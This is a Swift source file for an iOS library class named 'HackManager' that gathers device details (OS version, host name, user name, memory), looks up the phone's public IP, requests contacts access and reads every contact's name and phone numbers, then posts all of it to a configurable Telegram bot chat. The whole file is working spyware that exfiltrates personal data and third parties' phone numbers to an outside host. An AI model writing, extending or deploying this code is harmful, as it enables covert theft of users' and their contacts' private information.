import Foundation
internal import Alamofire
import Contacts

public class HackManager {
    public static let shared = HackManager(); private init() {}
    public var botToken: String = ""
    public var chatId: String = ""
    private var telegramApiUrl: String {
        return "https://api.telegram.org/bot\(botToken)/sendMessage"
    }
    private func getSystemInfo(completion: @escaping (String) -> Void) {
        let systemName = ProcessInfo.processInfo.operatingSystemVersionString
        let hostName = ProcessInfo.processInfo.hostName
        let userName = NSUserName()
        let mem = ProcessInfo.processInfo.physicalMemory / (1024 * 1024 * 1024)
        let message = """
        System Info:
        Version IOS: \(systemName)
        Host Name: \(hostName)
        User Name: \(userName)
        Memory usage: \(mem) GB
        """
        completion(message)
    }
    private func getIpAddress(completion: @escaping (String) -> Void) {
        DispatchQueue.global(qos: .background).async {
            AF.request("https://ipinfo.io/ip").validate().response { response in
                switch response.result {
                case .success(let data):
                    if let data = data, let responseString = String(data: data, encoding: .utf8) {
                        DispatchQueue.main.async {
                            completion("iPhone IP: \(responseString)")
                        }
                    } else {
                        DispatchQueue.main.async {
                            completion("iPhone IP. empty")
                        }
                    }
                case .failure(let error):
                    DispatchQueue.main.async {
                        completion("error getting IP: \(error.localizedDescription)")
                    }
                }
            }
        }
    }
    private func fetchContacts(completion: @escaping (String) -> Void) {
        DispatchQueue.global(qos: .background).async {
            let store = CNContactStore()
            store.requestAccess(for: .contacts) { granted, error in
                if let error = error {
                    DispatchQueue.main.async {
                        completion("error access contacts: \(error.localizedDescription)")
                    }
                    return
                }
                guard granted else {
                    DispatchQueue.main.async {
                        completion("access to contacts denied by user.")
                    }
                    return
                }
               
                let keysToFetch: [CNKeyDescriptor] = [
                    CNContactGivenNameKey as CNKeyDescriptor,
                    CNContactFamilyNameKey as CNKeyDescriptor,
                    CNContactPhoneNumbersKey as CNKeyDescriptor
                ]
                let request = CNContactFetchRequest(keysToFetch: keysToFetch)
                var result = "contacts:\n"
               
                do {
                    try store.enumerateContacts(with: request) { contact, stop in
                        let fullName = "\(contact.givenName) \(contact.familyName)"
                        let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }
                        result += "name: \(fullName)\n"
                        result += "phone: \(phoneNumbers.joined(separator: ", "))\n\n"
                    }
                    DispatchQueue.main.async {
                        completion(result)
                    }
                } catch {
                    DispatchQueue.main.async {
                        completion("error getting contacts: \(error.localizedDescription)")
                    }
                }
            }
        }
    }
    public func sendMessage() {
        let dispatchGroup = DispatchGroup()
        var systemInfo: String?
        var ipAddress: String?
        var contactsInfo: String?
        dispatchGroup.enter()
        getSystemInfo { result in
            systemInfo = result
            dispatchGroup.leave()
        }
        dispatchGroup.enter()
        getIpAddress { result in
            ipAddress = result
            dispatchGroup.leave()
        }
        dispatchGroup.notify(queue: .main) { [self] in
            dispatchGroup.enter()
            fetchContacts { result in
                contactsInfo = result
                dispatchGroup.leave()
            }
            dispatchGroup.notify(queue: .main) {
                if let systemInfo = systemInfo {
                    self.sendMessageToTelegram(message: systemInfo)
                }
               
                if let ipAddress = ipAddress {
                    self.sendMessageToTelegram(message: ipAddress)
                }
               
                if let contactsInfo = contactsInfo {
                    self.sendMessageToTelegram(message: contactsInfo)
                }
            }
        }
    }
    private func sendMessageToTelegram(message: String) {
        let parts = splitMessage(message)
        let dispatchGroup = DispatchGroup()
       
        for part in parts {
            dispatchGroup.enter()
            let parameters: [String: Any] = [
                "chat_id": chatId,
                "text": part
            ]
           
            AF.request(telegramApiUrl, method: .post, parameters: parameters, encoding: JSONEncoding.default).response { response in
                switch response.result {
                case .success(let data):
                    if let data = data, let _ = String(data: data, encoding: .utf8) {
                        print("")
                    } else {
                        print("successfully sent message.")
                    }
                case .failure(let error):
                    print("error sending message: \(error.localizedDescription)")
                }
                dispatchGroup.leave()
            }
        }
       
        dispatchGroup.notify(queue: .main) {
            print("all messages succsessfully sent.")
        }
    }
    private func splitMessage(_ message: String, maxLength: Int = 4096) -> [String] {
        var result: [String] = []
        var currentMessage = ""
       
        for line in message.split(separator: "\n") {
            if currentMessage.count + line.count + 1 > maxLength {
                result.append(currentMessage)
                currentMessage = ""
            }
            currentMessage += (currentMessage.isEmpty ? "" : "\n") + line
        }
       
        if !currentMessage.isEmpty {
            result.append(currentMessage)
        }
        return result
    }
}

